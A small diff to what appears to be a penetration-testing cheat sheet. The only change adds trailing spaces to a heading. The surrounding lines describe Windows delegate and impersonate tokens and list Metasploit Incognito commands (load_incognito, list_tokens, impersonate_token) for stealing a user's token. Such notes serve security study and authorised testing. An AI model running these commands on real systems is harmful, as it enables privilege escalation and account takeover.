@@ -21,7 +21,7 @@ evil-winrm
 **Delegate**: creating for logging into a machine or RDP.    
 **Impersonate**: "non-interactive", such as attachind network drive or a domain logon script.    
 
-**Metasploit: Incognito**
+**Metasploit: Incognito**    
 load_incognito //load module.    
 list_tokens -u //list tokens for users.    
 impersonate_token domain\\username //exploit.    
